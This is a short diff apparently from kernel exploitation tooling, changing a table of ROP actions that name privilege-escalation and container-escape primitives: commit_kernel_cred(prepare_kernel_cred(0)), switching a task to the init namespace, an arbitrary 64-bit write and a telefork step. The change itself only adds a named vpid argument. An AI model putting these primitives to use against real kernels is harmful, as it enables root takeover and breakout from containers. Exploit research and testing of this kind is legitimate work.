@@ -22,7 +22,7 @@ symbols = {
 rop_actions = {
     0x01: "msleep(ARG_time_msec)",
     0x02: "commit_kernel_cred(prepare_kernel_cred(0))",
-    0x03: "switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)",
+    0x03: "switch_task_namespaces(find_task_by_vpid(ARG_vpid=1), init_nsproxy)",
     0x04: "write_what_where_64(ARG_address, ARG_new_value)",
     0x05: "fork()",
     0x06: "telefork(ARG_sleep_msec=0xffffffff)",
